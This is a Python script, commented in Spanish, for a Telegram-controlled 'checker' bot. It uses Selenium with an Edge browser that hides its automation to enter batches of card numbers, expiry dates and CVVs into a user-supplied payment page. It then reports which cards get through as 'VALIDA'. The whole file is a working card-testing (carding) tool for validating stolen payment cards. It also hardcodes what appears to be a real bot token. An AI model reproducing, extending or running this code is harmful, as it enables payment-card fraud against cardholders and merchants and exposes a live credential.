import os
import re
import sys
import time
import json
import asyncio
import datetime
import threading
import subprocess
from typing import Dict, List, Tuple, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

from selenium import webdriver
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Token del Bot de Telegram proporcionado
BOT_TOKEN = "8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM"

# Rutas de archivos
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_DATA_FILE = os.path.join(BASE_DIR, "user_data.json")
LOG_FILE = os.path.join(BASE_DIR, "debug.log")
DEFAULT_CARDS_FILE = os.path.join(BASE_DIR, "a.txt")

# Sincronización de log
print_lock = threading.Lock()

def registrar_log(bot_id, num_tarjeta, estado, mensaje):
    """Registra eventos en consola y en debug.log."""
    ahora = datetime.datetime.now().strftime("%H:%M:%S")
    estado_upper = estado.upper()
    num_mostrar = f"({num_tarjeta})" if num_tarjeta else ""
    linea = f"[{ahora}] [{estado_upper:<10}] [Bot {bot_id}] {num_mostrar}: {mensaje}\n"
    with print_lock:
        print(linea.strip())
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(linea)
        except Exception:
            pass

# =====================================================================
# GESTIÓN DE USUARIOS Y URLs INDEPENDIENTES
# =====================================================================

class UserManager:
    """Gestiona URLs y datos de forma independiente por cada usuario en Telegram."""
    def __init__(self, filepath=USER_DATA_FILE):
        self.filepath = filepath
        self.lock = threading.Lock()
        self.data = self._load()

    def _load(self) -> dict:
        if os.path.exists(self.filepath):
            try:
                with open(self.filepath, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                return {}
        return {}

    def _save(self):
        try:
            with open(self.filepath, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando datos de usuario: {e}")

    def get_url(self, user_id: int) -> Optional[str]:
        with self.lock:
            user_entry = self.data.get(str(user_id), {})
            return user_entry.get("url")

    def set_url(self, user_id: int, url: str):
        with self.lock:
            uid = str(user_id)
            if uid not in self.data:
                self.data[uid] = {}
            self.data[uid]["url"] = url
            self.data[uid]["updated_at"] = datetime.datetime.now().isoformat()
            self._save()

    def delete_url(self, user_id: int):
        with self.lock:
            uid = str(user_id)
            if uid in self.data and "url" in self.data[uid]:
                del self.data[uid]["url"]
                self._save()

user_manager = UserManager()

# Estado en memoria para flujos interactivos por usuario
# user_id -> {'step': str, 'pending_cards': list, 'pending_url': str}
user_conversations: Dict[int, dict] = {}

# Tareas activas de chequeo por usuario
# user_id -> {'stop_event': threading.Event(), 'driver': driver, 'running': bool}
active_jobs: Dict[int, dict] = {}

# =====================================================================
# PARSER DE TARJETAS
# =====================================================================

def parsear_tarjetas_texto(texto: str) -> List[Tuple[str, str, str]]:
    """Extrae tarjetas en formato (16 dígitos, 4 dígitos exp MMYY, 3 dígitos CVV)."""
    if not texto:
        return []

    lineas = texto.strip().splitlines()
    tarjetas = []

    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue

        # Si viene con comando al inicio (/chk ...), quitarlo
        if linea.startswith("/"):
            partes = linea.split(maxsplit=1)
            if len(partes) > 1:
                linea = partes[1].strip()
            else:
                continue

        # Formatos separados por pipes, barras, espacios o guiones
        tokens = re.split(r"[\s|/:\-]+", linea)
        tokens = [t for t in tokens if t]

        if len(tokens) >= 4 and len(tokens[0]) >= 15 and tokens[0].isdigit():
            p16 = tokens[0]
            mm = tokens[1].zfill(2)
            yy = tokens[2][-2:] if len(tokens[2]) >= 2 else tokens[2]
            p4 = mm + yy
            p3 = tokens[3][:4]
            tarjetas.append((p16, p4, p3))
            continue
        elif len(tokens) >= 3 and len(tokens[0]) >= 15 and tokens[0].isdigit():
            p16 = tokens[0]
            p4 = tokens[1]
            p3 = tokens[2]
            tarjetas.append((p16, p4, p3))
            continue

        # Caso continuo (secuencia de dígitos)
        digitos = re.sub(r"\D", "", linea)
        if len(digitos) >= 23:
            for i in range(0, len(digitos), 23):
                bloque = digitos[i:i+23]
                if len(bloque) >= 16:
                    p16 = bloque[:16]
                    p4 = bloque[16:20] if len(bloque) >= 20 else bloque[16:]
                    p3 = bloque[20:23] if len(bloque) >= 23 else bloque[20:]
                    tarjetas.append((p16, p4, p3))
        elif len(digitos) >= 16:
            p16 = digitos[:16]
            p4 = digitos[16:20] if len(digitos) >= 20 else digitos[16:]
            p3 = digitos[20:23] if len(digitos) >= 23 else digitos[20:]
            tarjetas.append((p16, p4, p3))

    return tarjetas

def obtener_tarjetas_archivo(archivo=DEFAULT_CARDS_FILE) -> List[Tuple[str, str, str]]:
    """Lee tarjetas desde archivo si existe."""
    if not os.path.exists(archivo):
        return []
    with open(archivo, "r", encoding="utf-8") as f:
        contenido = f.read()
    return parsear_tarjetas_texto(contenido)

def formatear_tarjeta_str(p16: str, p4: str, p3: str) -> str:
    """Devuelve la tarjeta en formato estándar 0000000000000000|MM/YY|CVV"""
    exp = f"{p4[:2]}/{p4[2:]}" if len(p4) == 4 else p4
    return f"{p16}|{exp}|{p3}"

# =====================================================================
# MOTOR SELENIUM (EDGE)
# =====================================================================

def crear_driver(es_headless=True):
    """Crea una instancia de Edge WebDriver optimizada."""
    edge_options = Options()
    edge_options.page_load_strategy = 'eager'

    if es_headless:
        edge_options.add_argument("--headless=new")
        edge_options.add_argument("--disable-gpu")
        edge_options.add_argument("--window-size=1920,1080")
    else:
        edge_options.add_argument("--start-maximized")

    edge_options.add_argument("--no-sandbox")
    edge_options.add_argument("--disable-dev-shm-usage")
    edge_options.add_argument("--disable-blink-features=AutomationControlled")
    edge_options.add_argument("--disable-notifications")
    edge_options.add_argument("--log-level=3")
    edge_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    edge_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")

    driver = webdriver.Edge(options=edge_options)
    driver.set_page_load_timeout(18)
    driver.set_script_timeout(10)
    return driver

def cerrar_driver_seguro(driver, bot_id=1, num_tarjeta=""):
    """Cierra el driver de forma segura y garantiza liberación de recursos."""
    if not driver:
        return

    registrar_log(bot_id, num_tarjeta, "CERRANDO", "Cerrando navegador...")
    driver_pid = None
    try:
        if hasattr(driver, 'service') and driver.service and driver.service.process:
            driver_pid = driver.service.process.pid
    except Exception:
        pass

    def _do_quit():
        try:
            driver.quit()
        except Exception:
            pass

    t = threading.Thread(target=_do_quit)
    t.daemon = True
    t.start()
    t.join(timeout=3.5)

    if driver_pid:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(driver_pid)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

def normalizar_texto(texto: str) -> str:
    """Pasa a minúsculas y remueve acentos."""
    if not texto:
        return ""
    texto = texto.lower()
    for con, sin in [('á', 'a'), ('é', 'e'), ('í', 'i'), ('ó', 'o'), ('ú', 'u'), ('ü', 'u')]:
        texto = texto.replace(con, sin)
    return texto

def extraer_textos_pagina(driver) -> str:
    """Extrae texto visible de ventana principal y de iframes."""
    textos = []
    js_extract = """
    function getVisibleText() {
        var b = document.body;
        if (!b) return "";
        var clone = b.cloneNode(true);
        var toRemove = clone.querySelectorAll("script, style, noscript");
        for (var i = 0; i < toRemove.length; i++) {
            toRemove[i].parentNode.removeChild(toRemove[i]);
        }
        return (clone.innerText || clone.textContent || "");
    }
    return getVisibleText();
    """
    try:
        if driver.title:
            textos.append(driver.title)
    except Exception:
        pass
    try:
        if driver.current_url:
            textos.append(driver.current_url)
    except Exception:
        pass

    try:
        driver.switch_to.default_content()
        txt_body = driver.execute_script(js_extract)
        if txt_body:
            textos.append(txt_body)
    except Exception:
        pass

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for i in range(len(iframes)):
            try:
                driver.switch_to.default_content()
                iframes_actual = driver.find_elements(By.TAG_NAME, "iframe")
                if i < len(iframes_actual):
                    driver.switch_to.frame(iframes_actual[i])
                    txt_frame = driver.execute_script(js_extract)
                    if txt_frame:
                        textos.append(txt_frame)
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

    return " \n ".join(textos)

def verificar_estado_pago(driver) -> Tuple[Optional[str], Optional[str]]:
    """
    Comprueba si la página indica VALIDA ("Redireccionando...") o ERROR ("Autenticación fallida", "error").
    """
    try:
        # Alerta nativa de javascript
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert_norm = normalizar_texto(alert_text)
            if "redireccionando" in alert_norm or "redirigiendo" in alert_norm:
                return ("VALIDA", f"Alerta: {alert_text}")
            if "error" in alert_norm or "fallida" in alert_norm or "denegada" in alert_norm:
                try:
                    alert.accept()
                except Exception:
                    pass
                return ("ERROR", f"Alerta: {alert_text}")
        except Exception:
            pass

        # Texto visible
        texto_completo = extraer_textos_pagina(driver)
        texto_norm = normalizar_texto(texto_completo)

        # Si aparece 'Redireccionando...'
        if "redireccionando" in texto_norm or "redirigiendo" in texto_norm:
            return ("VALIDA", "Redireccionando...")

        # Errores y autenticaciones fallidas
        if "autenticacion fallida" in texto_norm or "autenticacion ha fallado" in texto_norm:
            return ("ERROR", "Autenticación fallida")

        if re.search(r"\berror\b", texto_norm):
            match = re.search(r"[^\n.]{0,35}\berror\b[^\n.]{0,35}", texto_norm)
            snippet = match.group(0).strip() if match else "Error"
            return ("ERROR", f"Error detectado ({snippet})")

        if ("fallo la autenticacion" in texto_norm or 
            "pago rechazado" in texto_norm or 
            "tarjeta rechazada" in texto_norm or 
            "transaccion denegada" in texto_norm or 
            "operacion denegada" in texto_norm):
            return ("ERROR", "Operación rechazada/denegada")

    except Exception:
        pass

    return (None, None)

def hacer_clic_en_ahorrar(driver, bot_id, num_tarjeta, timeout=10) -> bool:
    """Busca el botón final (ahorrar, pagar, guardar) y hace clic."""
    registrar_log(bot_id, num_tarjeta, "BOTÓN", "Buscando botón final ('ahorrar' / 'pagar')...")
    start_time = time.time()
    
    mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZÁÉÍÓÚ"
    minus = "abcdefghijklmnopqrstuvwxyzáéíóú"
    palabras = ["ahorrar", "ahorra", "pagar", "paga", "guardar", "pay", "save", "continuar", "confirmar"]

    def buscar_y_clicar():
        for palabra in palabras:
            xpath_exp = (
                f"//*[(self::button or self::input or self::a or self::span or self::div) and ("
                f"contains(translate(text(), '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(., '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(@value, '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(@aria-label, '{mayus}', '{minus}'), '{palabra}'))]"
            )
            elementos = driver.find_elements(By.XPATH, xpath_exp)
            visibles = [el for el in elementos if el.is_displayed()]
            if visibles:
                def prioridad(el):
                    tag = el.tag_name.lower()
                    p_tag = 0 if tag in ('button', 'input') else (1 if tag == 'a' else 2)
                    p_len = len(el.text.strip()) if el.text else 50
                    return (p_tag, p_len)

                visibles.sort(key=prioridad)
                target = visibles[0]
                try:
                    driver.execute_script("arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", target)
                except Exception:
                    pass
                time.sleep(0.15)
                try:
                    target.click()
                except Exception:
                    driver.execute_script("arguments[0].click();", target)
                return True

        submits = driver.find_elements(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']")
        for sub in submits:
            if sub.is_displayed():
                try:
                    driver.execute_script("arguments[0].click();", sub)
                    return True
                except Exception:
                    pass
        return False

    try:
        while time.time() - start_time < timeout:
            try:
                if buscar_y_clicar():
                    registrar_log(bot_id, num_tarjeta, "BOTÓN", "Clic en botón final completado.")
                    driver.switch_to.default_content()
                    return True

                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        if buscar_y_clicar():
                            registrar_log(bot_id, num_tarjeta, "BOTÓN", "Clic en botón completado (iframe).")
                            driver.switch_to.default_content()
                            return True
                        driver.switch_to.default_content()
                    except Exception:
                        driver.switch_to.default_content()
            except Exception:
                pass
            time.sleep(0.3)
        return False
    finally:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

def recargar_link_cmd(driver, link, bot_id=1, num_tarjeta=""):
    """Recarga la URL inicial."""
    try:
        driver.switch_to.default_content()
    except Exception:
        pass
    try:
        driver.get(link)
    except Exception:
        try:
            driver.execute_script("window.stop();")
        except Exception:
            pass

def probar_tarjeta(driver, bot_id: int, link: str, datos_tarjeta: Tuple[str, str, str], stop_event: threading.Event) -> Tuple[str, str, Optional[str]]:
    """
    Rellena los datos de la tarjeta y evalúa el resultado.
    Retorna: (estado, detalle, redirect_url)
      - estado: 'VALIDA', 'INVALID', 'STOPPED', 'ERROR'
      - redirect_url: enlace capturado de la barra de direcciones en cuanto aparece 'Redireccionando...'
    """
    parte_16, parte_4, parte_3 = datos_tarjeta

    if stop_event.is_set():
        return ("STOPPED", "Chequeo cancelado por el usuario", None)

    try:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

        registrar_log(bot_id, parte_16, "PROBANDO", f"Cargando URL: {link}")
        try:
            driver.get(link)
        except Exception:
            try:
                driver.execute_script("window.stop();")
            except Exception:
                pass

        if stop_event.is_set():
            return ("STOPPED", "Chequeo cancelado por el usuario", None)

        wait = WebDriverWait(driver, 12)
        selector_tarjeta = "//input[@id='number' or @autocomplete='cc-number' or @autocomplete='a-number' or contains(@id, 'card') or contains(@name, 'card') or contains(@class, 'card-number')]"

        campo_input = None
        try:
            campo_input = wait.until(EC.element_to_be_clickable((By.XPATH, selector_tarjeta)))
        except Exception:
            try:
                campo_input = wait.until(EC.presence_of_element_located((By.XPATH, selector_tarjeta)))
            except Exception:
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        campo_input = driver.find_element(By.XPATH, selector_tarjeta)
                        if campo_input:
                            break
                        driver.switch_to.default_content()
                    except Exception:
                        driver.switch_to.default_content()

        if not campo_input:
            registrar_log(bot_id, parte_16, "ERROR", "No se encontró campo de tarjeta tras 12s.")
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("INVALID", "No se encontró campo de tarjeta", None)

        # 1. Número de tarjeta (16 dígitos)
        try:
            campo_input.click()
        except Exception:
            driver.execute_script("arguments[0].click();", campo_input)

        try:
            campo_input.clear()
        except Exception:
            pass
        try:
            campo_input.send_keys(Keys.CONTROL + "a")
            campo_input.send_keys(Keys.BACKSPACE)
        except Exception:
            pass

        registrar_log(bot_id, parte_16, "PROBANDO", "Escribiendo dígitos...")
        for char in parte_16:
            campo_input.send_keys(char)
            time.sleep(0.02)

        time.sleep(0.15)

        # 2. Fecha de expiración (MM/AA)
        if parte_4:
            campo_input.send_keys(Keys.TAB)
            time.sleep(0.15)
            campo_2 = driver.switch_to.active_element
            try:
                campo_2.send_keys(Keys.CONTROL + "a")
                campo_2.send_keys(Keys.BACKSPACE)
            except Exception:
                pass
            for char in parte_4:
                campo_2.send_keys(char)
                time.sleep(0.02)

            time.sleep(0.15)

            # 3. CVV
            if parte_3:
                campo_2.send_keys(Keys.TAB)
                time.sleep(0.15)
                campo_3 = driver.switch_to.active_element
                try:
                    campo_3.send_keys(Keys.CONTROL + "a")
                    campo_3.send_keys(Keys.BACKSPACE)
                except Exception:
                    pass
                for char in parte_3:
                    campo_3.send_keys(char)
                    time.sleep(0.02)

        time.sleep(0.3)

        # Comprobar si ya saltó error inmediato en el formulario
        estado_prev, detalle_prev = verificar_estado_pago(driver)
        if estado_prev == "ERROR":
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("INVALID", detalle_prev or "Error en formulario", None)

        # 4. Clic en botón final
        clicado = hacer_clic_en_ahorrar(driver, bot_id=bot_id, num_tarjeta=parte_16)
        if not clicado:
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("INVALID", "No se encontró botón final", None)

        # 5. Monitorear durante 12 segundos por "Redireccionando..." o "ERROR"
        registrar_log(bot_id, parte_16, "ESPERANDO", "Monitoreando estado durante 12s...")
        inicio_espera = time.time()
        tiempo_limite = 12.0

        while time.time() - inicio_espera < tiempo_limite:
            if stop_event.is_set():
                return ("STOPPED", "Chequeo cancelado", None)

            estado, detalle = verificar_estado_pago(driver)

            # SI DETECTA "Redireccionando..." -> VÁLIDA
            if estado == "VALIDA":
                registrar_log(bot_id, parte_16, "VALIDA", f"¡¡¡ VÁLIDA DETECTADA: {detalle} !!!")

                # Copiar rápidamente el link de arriba (URL)
                url_redireccion = None
                try:
                    url_redireccion = driver.current_url
                except Exception:
                    pass

                # Esperar hasta 2 segundos para capturar el link final si está cambiando
                limite_url = time.time() + 2.0
                while time.time() < limite_url:
                    try:
                        curr = driver.current_url
                        if curr and curr != link and curr != "about:blank":
                            url_redireccion = curr
                            break
                    except Exception:
                        pass
                    time.sleep(0.15)

                if not url_redireccion:
                    try:
                        url_redireccion = driver.current_url
                    except Exception:
                        url_redireccion = link

                registrar_log(bot_id, parte_16, "VALIDA", f"URL Copiada: {url_redireccion}")
                return ("VALIDA", detalle or "Redireccionando...", url_redireccion)

            # Si detecta error o autenticación fallida
            if estado == "ERROR":
                registrar_log(bot_id, parte_16, "ERROR", f"Detectado error: {detalle}")
                recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
                return ("INVALID", detalle or "Autenticación fallida", None)

            time.sleep(0.25)

        # Agotados los 12 segundos sin 'Redireccionando...'
        registrar_log(bot_id, parte_16, "AVISO", "12s agotados sin redirección.")
        recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
        return ("INVALID", "12s agotados sin redirección (No válida)", None)

    except Exception as e:
        registrar_log(bot_id, parte_16, "ERROR", f"Excepción en prueba: {e}")
        try:
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
        except Exception:
            pass
        return ("INVALID", f"Error: {e}", None)

# =====================================================================
# EJECUCIÓN DEL CHEQUEO ASÍNCRONO
# =====================================================================

def ejecutar_proceso_chequeo(chat_id: int, user_id: int, url: str, tarjetas: List[Tuple[str, str, str]], bot_app: Application, loop: asyncio.AbstractEventLoop):
    """
    Función síncrona que corre en hilo secundario para no congelar Telegram.
    Procesa las tarjetas secuencialmente usando Selenium Edge.
    """
    job_info = active_jobs.get(user_id)
    if not job_info:
        return

    stop_event = job_info['stop_event']
    driver = None

    def enviar_telegram(texto: str):
        """Envía mensaje a Telegram desde el hilo secundario."""
        try:
            coro = bot_app.bot.send_message(chat_id=chat_id, text=texto)
            asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=10)
        except Exception as e:
            print(f"[!] Error enviando mensaje a Telegram: {e}")

    try:
        driver = crear_driver(es_headless=True)
        job_info['driver'] = driver

        total = len(tarjetas)
        enviar_telegram(f"🚀 Iniciando chequeo de {total} tarjeta(s)...\n🌐 URL: {url}")

        for idx, tarjeta in enumerate(tarjetas, 1):
            if stop_event.is_set():
                enviar_telegram("⏹️ Chequeo detenido por el usuario.")
                break

            p16, p4, p3 = tarjeta
            card_str = formatear_tarjeta_str(p16, p4, p3)

            estado, detalle, url_redireccion = probar_tarjeta(driver, 1, url, tarjeta, stop_event)

            if estado == "STOPPED":
                enviar_telegram("⏹️ Chequeo detenido por el usuario.")
                break

            if estado == "VALIDA":
                # Requisito: mensaje como valida y debajo el link copiado de arriba
                msg_valida = (
                    f"✅ VALIDA\n"
                    f"💳 {card_str}\n\n"
                    f"{url_redireccion}"
                )
                enviar_telegram(msg_valida)
                # Al encontrar la válida, se detiene el lote
                break
            else:
                # Requisito: si no pone valida saldra como INVALID y lo manda al telegram
                msg_invalid = (
                    f"❌ INVALID\n"
                    f"💳 {card_str}\n"
                    f"Motivo: {detalle}"
                )
                enviar_telegram(msg_invalid)

            if idx < total and not stop_event.is_set():
                time.sleep(1.0)
        else:
            enviar_telegram("🏁 Chequeo completado. Todas las tarjetas han sido procesadas.")

    except Exception as e:
        registrar_log(1, "", "ERROR", f"Error general en hilo de chequeo: {e}")
        enviar_telegram(f"⚠️ Ocurrió un error durante la ejecución: {e}")
    finally:
        if driver:
            cerrar_driver_seguro(driver, 1)
        active_jobs.pop(user_id, None)

# =====================================================================
# HANDLERS DE COMANDOS DE TELEGRAM
# =====================================================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start y bienvenida."""
    user = update.effective_user
    msg = (
        f"👋 ¡Hola, {user.first_name}!\n\n"
        f"Bienvenido al Bot de Chequeo.\n\n"
        f"📌 **Comandos Disponibles:**\n"
        f"🔹 `/chk` o `/chk <tarjeta>` : Iniciar chequeo. Si no tienes URL guardada te la pedirá.\n"
        f"🔹 `/url <nueva_url>` : Guardar o cambiar tu URL personal para futuros `/chk`.\n"
        f"🔹 `/url` : Ver tu URL configurada actual.\n"
        f"🔹 `/stop` : Detener el chequeo en curso.\n\n"
        f"ℹ️ Cada usuario tiene su propia URL guardada de forma 100% independiente."
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def cmd_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /url:
    - /url <enlace>: cambia la URL guardada del usuario independiente
    - /url: muestra la URL actual guardada
    """
    user_id = update.effective_user.id
    args = context.args

    if args:
        nueva_url = " ".join(args).strip()
        if not (nueva_url.startswith("http://") or nueva_url.startswith("https://")):
            nueva_url = "https://" + nueva_url

        user_manager.set_url(user_id, nueva_url)
        await update.message.reply_text(
            f"✅ **URL actualizada con éxito para tu usuario:**\n`{nueva_url}`\n\n"
            f"Se usará automáticamente en tus próximos `/chk`.",
            parse_mode="Markdown"
        )
    else:
        url_actual = user_manager.get_url(user_id)
        if url_actual:
            await update.message.reply_text(
                f"📌 **Tu URL guardada actual es:**\n`{url_actual}`\n\n"
                f"Para cambiarla por una nueva, usa:\n`/url <nueva_url>`",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                f"⚠️ **No tienes ninguna URL guardada todavía.**\n\n"
                f"Para guardar una, escribe:\n`/url <tu_url>`",
                parse_mode="Markdown"
            )

async def iniciar_chequeo_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, chat_id: int, url: str, tarjetas: List[Tuple[str, str, str]]):
    """Inicia el trabajo de chequeo en segundo plano."""
    if user_id in active_jobs:
        await context.bot.send_message(chat_id=chat_id, text="⏳ Ya tienes un chequeo activo. Usa `/stop` si deseas cancelarlo.")
        return

    if not tarjetas:
        tarjetas = obtener_tarjetas_archivo(DEFAULT_CARDS_FILE)

    if not tarjetas:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ No se encontraron tarjetas. Proporciona una tarjeta con `/chk <tarjeta>` o añade tarjetas en `a.txt`."
        )
        return

    stop_event = threading.Event()
    active_jobs[user_id] = {
        'stop_event': stop_event,
        'driver': None,
        'running': True
    }

    loop = asyncio.get_running_loop()
    threading.Thread(
        target=ejecutar_proceso_chequeo,
        args=(chat_id, user_id, url, tarjetas, context.application, loop),
        daemon=True
    ).start()

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /chk [tarjeta]:
    - Si no tiene URL guardada, la pide al usuario.
    - Una vez mande el URL, ofrece guardarlo o no para la próxima.
    - Si ya tiene URL guardada, arranca directamente usando su URL.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id in active_jobs:
        await update.message.reply_text("⏳ Ya tienes un chequeo en ejecución. Puedes detenerlo con `/stop`.")
        return

    # Extraer posibles tarjetas pasadas en los argumentos
    texto_args = " ".join(context.args) if context.args else ""
    tarjetas = parsear_tarjetas_texto(texto_args)

    saved_url = user_manager.get_url(user_id)

    if saved_url:
        # El usuario ya tiene URL guardada
        await update.message.reply_text(
            f"🔍 **Usando tu URL guardada:**\n`{saved_url}`\n\n⏳ Iniciando proceso...",
            parse_mode="Markdown"
        )
        await iniciar_chequeo_usuario(update, context, user_id, chat_id, saved_url, tarjetas)
    else:
        # No tiene URL guardada: pedirla
        user_conversations[user_id] = {
            'step': 'AWAITING_URL',
            'pending_cards': tarjetas
        }
        await update.message.reply_text(
            "🌐 **Por favor, introduce la URL** de la página de pago para realizar el chequeo:",
            parse_mode="Markdown"
        )

async def manejar_mensaje_texto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja mensajes de texto (para capturar la URL cuando está en espera)."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    texto = update.message.text.strip() if update.message.text else ""

    conv = user_conversations.get(user_id)
    if not conv or conv.get('step') != 'AWAITING_URL':
        return

    url = texto
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url

    conv['pending_url'] = url
    conv['step'] = 'AWAITING_SAVE_CHOICE'

    keyboard = [
        [
            InlineKeyboardButton("💾 Sí, guardar enlace", callback_data="save_url_yes"),
            InlineKeyboardButton("❌ No guardar", callback_data="save_url_no")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"🔗 **URL recibida:**\n`{url}`\n\n"
        f"¿Deseas guardar este enlace para tus próximos `/chk`?",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def manejar_callback_guardar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja la respuesta al botón de guardar URL (Sí / No)."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    chat_id = query.message.chat_id
    data = query.data

    conv = user_conversations.pop(user_id, None)
    if not conv or 'pending_url' not in conv:
        await query.edit_message_text("⚠️ Sesión expirada o no encontrada. Por favor, vuelve a usar `/chk`.")
        return

    url = conv['pending_url']
    tarjetas = conv.get('pending_cards', [])

    if data == "save_url_yes":
        user_manager.set_url(user_id, url)
        await query.edit_message_text(
            f"💾 **URL guardada con éxito para futuros `/chk`:**\n`{url}`\n\n🚀 Iniciando chequeo...",
            parse_mode="Markdown"
        )
    else:
        await query.edit_message_text(
            f"👌 **URL no guardada (se usará solo para esta prueba):**\n`{url}`\n\n🚀 Iniciando chequeo...",
            parse_mode="Markdown"
        )

    await iniciar_chequeo_usuario(update, context, user_id, chat_id, url, tarjetas)

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detiene el chequeo en curso del usuario."""
    user_id = update.effective_user.id
    job = active_jobs.get(user_id)

    if job:
        job['stop_event'].set()
        driver = job.get('driver')
        if driver:
            try:
                cerrar_driver_seguro(driver, 1)
            except Exception:
                pass
        await update.message.reply_text("⏹️ Solicitud de detención enviada. El navegador se cerrará en breve.")
    else:
        await update.message.reply_text("ℹ️ No tienes ningún chequeo activo en este momento.")

# =====================================================================
# INICIALIZACIÓN DE LA APLICACIÓN
# =====================================================================

def main():
    print("=" * 60)
    print("   INICIANDO BOT DE TELEGRAM - AUTOFILL CHECKER (EDGE)   ")
    print(f"   Token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-5:]}")
    print("=" * 60)

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Handlers de comandos
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("url", cmd_url))
    app.add_handler(CommandHandler("stop", cmd_stop))

    # Handlers para flujo interactivo de URL y botones
    app.add_handler(CallbackQueryHandler(manejar_callback_guardar, pattern=r"^save_url_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, manejar_mensaje_texto))

    print("[✓] Bot conectado a Telegram y escuchando mensajes...")
    app.run_polling()

if __name__ == "__main__":
    main()
